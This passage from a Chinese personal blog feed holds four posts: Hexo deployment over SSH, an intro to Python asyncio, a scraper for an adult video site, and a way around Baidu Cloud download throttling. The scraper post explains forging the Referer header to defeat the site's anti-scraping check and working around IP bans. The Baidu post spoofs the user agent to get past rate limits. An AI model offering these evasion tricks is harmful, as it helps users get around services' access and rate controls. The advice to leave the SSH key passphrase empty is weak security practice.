<p>3.填写项目名称描述创建即可</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-2.png" alt="5"></p>
<h2 id="配置SHH"><a href="#配置SHH" class="headerlink" title="配置SHH"></a>配置SHH</h2><p>配置shh key是让本地git项目与远程的github建立联系<br>1.检查是否已经有SSH Key，打开Git Bash，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> ~/.ssh</div></pre></td></tr></table></figure></p>
<p>2.如果没有.ssh这个目录，则生成一个新的SSH，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C <span class="string">"your e-mail"</span></div></pre></td></tr></table></figure></p>
<p>注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」<br>接下来几步都直接按回车键,然后系统会要你输入密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):&lt;输入加密串&gt;</div><div class="line">Enter same passphrase again:&lt;再次输入加密串&gt;</div></pre></td></tr></table></figure></p>
<p>这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便<br>注意：输入密码的时候没有*字样的，你直接输入就可以了。<br>3.最后看到这样的界面，就成功设置ssh key了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/wangzhanssh%20key.jpg" alt="6"></p>
<h2 id="添加-SSH-Key-到-GitHub和Coding"><a href="#添加-SSH-Key-到-GitHub和Coding" class="headerlink" title="添加 SSH Key 到 GitHub和Coding"></a>添加 SSH Key 到 GitHub和Coding</h2><p>复制<code>~/.ssh/id_rsa.pub</code>中的内容<br>~是个人文件夹，比如我的电脑上是C:\Users\Administrator.ssh\id_rsa.pub，将其中的文本复制<br>进入github，点击头像–&gt;Setting–&gt;SSH and GPG keys,然后在右侧点击New SSH key，<br>Title随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了<br>进入Coding.net，点击头像–&gt;个人设置–&gt;SSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok</p>
<h2 id="测试SSH是否配置成功"><a href="#测试SSH是否配置成功" class="headerlink" title="测试SSH是否配置成功"></a>测试SSH是否配置成功</h2><p>1.打开Git Bash，然后输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com</div></pre></td></tr></table></figure></p>
<p>如配置了密码则要输入密码,输完按回车<br>如果显示以下内容，则说明Github中的ssh配置成功。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi username! You<span class="string">'ve successfully authenticated, but GitHub does not</span></div><div class="line">provide shell access.</div></pre></td></tr></table></figure></p>
<p>2.再输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@git.coding.net</div></pre></td></tr></table></figure></p>
<p>如果显示以下则说明coding中的ssh配置成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello username You<span class="string">'ve connected to Coding.net by SSH successfully!</span></div></pre></td></tr></table></figure></p>
<h2 id="创建Github-Pages和Coding-Pages-服务"><a href="#创建Github-Pages和Coding-Pages-服务" class="headerlink" title="创建Github Pages和Coding Pages 服务"></a>创建Github Pages和Coding Pages 服务</h2><p>1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。<br>Coding Pages服务开启在官网说的很详细，不知道请百度<br>2.打开D:\blog文件夹中的_config.yml文件，找到如下位置，填写<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Deployment</span></div><div class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></div><div class="line">deploy:</div><div class="line">- <span class="built_in">type</span>: git</div><div class="line">  repo: </div><div class="line">    github: git@github.com:yourname/yourname.github.io.git,master</div><div class="line">    coding: git@git.coding.net:yourname/yourname.git,coding-pages</div></pre></td></tr></table></figure></p>
<p><strong>注：</strong> (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。</p>
<p>#部署完成<br>在blog文件夹中空白处右击打开Git Bash输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo clean</div><div class="line">hexo d- g</div></pre></td></tr></table></figure></p>
<p>此时，通过访问<a href="http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。" target="_blank" rel="external">http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装GIT和Node-JS&quot;&gt;&lt;a href=&quot;#安装GIT和Node-JS&quot; class=&quot;headerlink&quot; title=&quot;安装GIT和Node.JS&quot;&gt;&lt;/a&gt;安装GIT和Node.JS&lt;/h1&gt;&lt;p&gt;首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;git config --global user.name &lt;span class=&quot;string&quot;&gt;&quot;Your Name&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git config --global user.email &lt;span class=&quot;string&quot;&gt;&quot;email@example.com&quot;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。&lt;br&gt;&lt;strong&gt;注意：&lt;/strong&gt;git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="http://akkuman.coding.me/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Python异步爬虫的学习(一)</title>
    <link href="http://akkuman.coding.me/2016/12/11/Python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0(%E4%B8%80).html"/>
    <id>http://akkuman.coding.me/2016/12/11/Python异步爬虫的学习(一).html</id>
    <published>2016-12-11T08:26:49.000Z</published>
    <updated>2016-12-11T09:18:49.000Z</updated>
    
    <content type="html"><![CDATA[<hr>
<p>本文主要从一下几个方面进行说明:</p>
<ul>
<li>什么是<a href="http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B" target="_blank" rel="external">异步(Asynchronous)编程</a></li>
<li>为什么要使用异步编程？</li>
<li>如何利用Python实现异步</li>
</ul>
<hr>
<a id="more"></a>
<h1 id="什么是异步编程"><a href="#什么是异步编程" class="headerlink" title="什么是异步编程"></a>什么是异步编程</h1><h2 id="文章开始前，先简单介绍下各种-IO-模型："><a href="#文章开始前，先简单介绍下各种-IO-模型：" class="headerlink" title="文章开始前，先简单介绍下各种 IO 模型："></a>文章开始前，先简单介绍下各种 IO 模型：</h2><h3 id="最容易做的是阻塞-IO"><a href="#最容易做的是阻塞-IO" class="headerlink" title="最容易做的是阻塞 IO"></a>最容易做的是阻塞 IO</h3><p>即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。</p>
<h3 id="接着是非阻塞-IO"><a href="#接着是非阻塞-IO" class="headerlink" title="接着是非阻塞 IO"></a>接着是非阻塞 IO</h3><p>即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。</p>
<h3 id="然后是-IO-复用"><a href="#然后是-IO-复用" class="headerlink" title="然后是 IO 复用"></a>然后是 IO 复用</h3><p>即在读写数据前，先检查哪些描述符是可读写的，再去读写。select 和 poll 就是这样做的，它们会遍历所有被监视的描述符，查看是否满足，这个检查的过程是阻塞的。而 epoll、kqueue 和 /dev/poll 则做了些改进，事先注册需要检查哪些描述符的哪些事件，当状态发生变化时，内核会调用对应的回调函数，将这些描述符保存下来；下次获取可用的描述符时，直接返回这些发生变化的描述符即可。</p>
<h3 id="再之后是信号驱动"><a href="#再之后是信号驱动" class="headerlink" title="再之后是信号驱动"></a>再之后是信号驱动</h3><p>即描述符就绪时，内核发送 SIGIO 信号，再由信号处理程序去处理这些信号即可。不过信号处理的时机是从内核态返回用户态时，感觉也得把这些事件收集起来才好处理，有点像模拟 IO 复用了。</p>
<h3 id="最后是异步-IO"><a href="#最后是异步-IO" class="headerlink" title="最后是异步 IO"></a>最后是异步 IO</h3><p>即读写数据时，只注册事件，内核完成读写后（读取的数据会复制到用户态），再调用事件处理函数。这整个过程都不会阻塞调用线程，不过实现它的操作系统比较少，Windows 上有比较成熟的 IOCP，Linux 上的 AIO 则有不少缺点。<br>虽然真正的异步 IO 需要中间任何步骤都没有阻塞，这对于某些只是偶尔需要处理 IO 请求的情况确实有用（比如文本编辑器偶尔保存一下文件）；但对于服务器端编程的大多数情况而言，它的主线程就是用来处理 IO 请求的，如果在空闲时不阻塞在 IO 等待上，也没有别的事情能做，所以本文就不纠结这个异步是否名副其实了。</p>
<h2 id="然后我们了解一下事件循环-Event-Loop"><a href="#然后我们了解一下事件循环-Event-Loop" class="headerlink" title="然后我们了解一下事件循环(Event Loop)"></a>然后我们了解一下事件循环(Event Loop)</h2><p>Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制。</p>
<p><img src="http://image.beekka.com/blog/201310/2013102001.png" alt="Event Loop"></p>
<p>我们一般的单线程程序中，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。</p>
<p>如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。</p>
<p>那么这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。</p>
<p>于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。<br>具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）</p>
<pre><code>（1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。
（2）主线程之外，还存在一个&quot;任务队列&quot;（task queue）。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。
（3）一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。
（4）主线程不断重复上面的第三步。
</code></pre><p>下图就是主线程和任务队列的示意图。</p>
<p><img src="http://image.beekka.com/blog/2014/bg2014100801.jpg" alt=""></p>
<p>只要主线程空了，就会去读取”任务队列”，这个过程会不断重复。</p>
<p>所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。</p>
<h1 id="为什么要使用异步编程？"><a href="#为什么要使用异步编程？" class="headerlink" title="为什么要使用异步编程？"></a>为什么要使用异步编程？</h1><p>CPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。</p>
<p>在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。</p>
<p>因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。</p>
<p>多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。</p>
<p>由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。</p>
<p>另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。</p>
<h1 id="如何利用Python实现异步"><a href="#如何利用Python实现异步" class="headerlink" title="如何利用Python实现异步"></a>如何利用Python实现异步</h1><p>我们首先需要了解以下几个概念：</p>
<ul>
<li>Event Loop</li>
<li>Coroutine</li>
</ul>
<p>其中Event Loop在前面已经解释过<br>Coroutine是协程，具体解释可以查阅<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090171191d05dae6e129940518d1d6cf6eeaaa969000" target="_blank" rel="external">协程</a></p>
<p>Python 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性：</p>
<ul>
<li>通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的；</li>
<li>协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。</li>
</ul>
<p>这里我就从廖大哪里搬运个小例子(有改动)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'Hello world! (%s)'</span> % threading.currentThread())</div><div class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</div><div class="line">    print(<span class="string">'Hello again! (%s)'</span> % threading.currentThread())</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">tasks = [hello(), hello()]</div><div class="line">loop.run_until_complete(asyncio.wait(tasks))</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p>
<p>执行结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">(暂停约<span class="number">1</span>秒)</div><div class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div><div class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</div></pre></td></tr></table></figure>
<p>其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行<br>hello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。</p>
<p>下一篇文章将在此基础上实现一个简洁、普适的爬虫框架</p>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;本文主要从一下几个方面进行说明:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是&lt;a href=&quot;http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B&quot;&gt;异步(Asynchronous)编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;为什么要使用异步编程？&lt;/li&gt;
&lt;li&gt;如何利用Python实现异步&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>javbus爬虫-老司机你值得拥有</title>
    <link href="http://akkuman.coding.me/2016/12/06/javbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html"/>
    <id>http://akkuman.coding.me/2016/12/06/javbus爬虫-老司机你值得拥有.html</id>
    <published>2016-12-06T10:21:53.000Z</published>
    <updated>2016-12-06T12:00:42.000Z</updated>
    
    <content type="html"><![CDATA[<hr>
<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><hr>
<p>有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的<a href="https://www.javbus5.com/SRS-055这种链接，" target="_blank" rel="external">https://www.javbus5.com/SRS-055这种链接，</a><br>我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了</p>
<hr>
<h1 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h1><hr>
<ul>
<li>爬虫调度启动程序crawler.py</li>
<li>页面下载程序downloader.py</li>
<li>页面解析程序pageparser.py</li>
<li>数据库入库与去重管理程序controler.py</li>
</ul>
<a id="more"></a>
<p>爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接</p>
<p>在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库</p>
<p>当这一页所有的子链接爬取完成后，继续爬取下一页。</p>
<p>将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。</p>
<p>对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上</p>
<hr>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><hr>
<p>在写爬虫的过程中遇到了一些问题</p>
<ol>
<li><p>在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了</p>
</li>
<li><p>本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程</p>
</li>
<li><p>就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止</p>
</li>
<li><p>存在反扒策略<br>详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg" alt="1"></p>
<p>我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921</div></pre></td></tr></table></figure>
<p>那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了</p>
<p>通过对html源文件的搜索，我们即可直接发现答案<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png" alt="3"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png" alt="4"><br>通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样</p>
<p>我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png" alt="2"></p>
<p>那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png" alt="5"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg" alt="6"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png" alt="7"></p>
</li>
<li><p>常见的Python2.x编码问题,全部转换为unicode字节流就可以了<br> 这个问题在我博客中已经记录了<a href="http://www.53xiaoshuo.com/Python/77.html" target="_blank" rel="external">http://www.53xiaoshuo.com/Python/77.html</a><br> 有兴趣的童鞋可以看看</p>
</li>
<li><p>遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错<br>导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png" alt="8"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg" alt="9"><br>比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库</p>
<p>在这其中纠结了一个问题<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png" alt="10"></p>
<p>就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点<br>最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了</p>
</li>
</ol>
<hr>
<h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><hr>
<ol>
<li><p>对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造</p>
</li>
<li><p>对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情</p>
</li>
<li><p>多看别人的博客学习思路</p>
</li>
</ol>
<hr>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><hr>
<p>爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库</p>
<hr>
<h1 id="测试展与地址"><a href="#测试展与地址" class="headerlink" title="测试展与地址"></a>测试展与地址</h1><hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg" alt="11"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg" alt="12"></p>
<hr>
<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址:"></a>代码地址:</h2><hr>
<ul>
<li><em>coding.net</em>    <a href="https://coding.net/u/Akkuman/p/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
<li><em>github.com</em>    <a href="https://github.com/akkuman/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
</ul>
<p>司机的名声总算是没有辱没，秋名山依旧，嘿嘿<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&amp;fm=116&amp;gp=0.jpg" alt="13"></p>
<p><strong>转载请注明来源作者</strong></p>
<ul>
<li>博客：53xiaoshuo.com | hacktech.cn</li>
<li>作者：Akkuman</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的&lt;a href=&quot;https://www.javbus5.com/SRS-055这种链接，&quot;&gt;https://www.javbus5.com/SRS-055这种链接，&lt;/a&gt;&lt;br&gt;我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;构思&quot;&gt;&lt;a href=&quot;#构思&quot; class=&quot;headerlink&quot; title=&quot;构思&quot;&gt;&lt;/a&gt;构思&lt;/h1&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;爬虫调度启动程序crawler.py&lt;/li&gt;
&lt;li&gt;页面下载程序downloader.py&lt;/li&gt;
&lt;li&gt;页面解析程序pageparser.py&lt;/li&gt;
&lt;li&gt;数据库入库与去重管理程序controler.py&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>突破百度云限速与网页限制批量下载</title>
    <link href="http://akkuman.coding.me/2016/12/06/%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD.html"/>
    <id>http://akkuman.coding.me/2016/12/06/突破百度云限速与网页限制批量下载.html</id>
    <published>2016-12-06T06:33:26.000Z</published>
    <updated>2016-12-06T06:34:24.591Z</updated>
    
    <content type="html"><![CDATA[<p><strong>百度云限速比较坑，现在基本200k左右</strong><br><strong>很多人都知道了，但是总有朋友问我，我说明一下</strong></p>
<h1 id="首先下载IDM-最好支持正版"><a href="#首先下载IDM-最好支持正版" class="headerlink" title="首先下载IDM(最好支持正版)"></a>首先下载IDM(最好支持正版)</h1><p>下载链接：<br><a href="https://eyun.baidu.com/s/3nvg3jdf" target="_blank" rel="external">百度云shaoit</a></p>
<h1 id="开始下载："><a href="#开始下载：" class="headerlink" title="开始下载："></a>开始下载：</h1><p>一般的话，小文件直接打开浏览器就可以下载</p>
<h1 id="大文件下载："><a href="#大文件下载：" class="headerlink" title="大文件下载："></a>大文件下载：</h1><p>首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载</p>
<h1 id="批量下载与外链获取"><a href="#批量下载与外链获取" class="headerlink" title="批量下载与外链获取"></a>批量下载与外链获取</h1><p>使用这个脚本，具体看链接内介绍</p>
<a id="more"></a>
<p><a href="https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B" target="_blank" rel="external">https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B</a></p>
<h2 id="如何安装用户脚本"><a href="#如何安装用户脚本" class="headerlink" title="如何安装用户脚本"></a>如何安装用户脚本</h2><ul>
<li>Firefox 及相关的浏览器：Greasemonkey。</li>
<li>Google Chrome、Chromium 及相关的浏览器：Tampermonkey。</li>
<li>Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。</li>
<li>Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;百度云限速比较坑，现在基本200k左右&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;很多人都知道了，但是总有朋友问我，我说明一下&lt;/strong&gt;&lt;/p&gt;
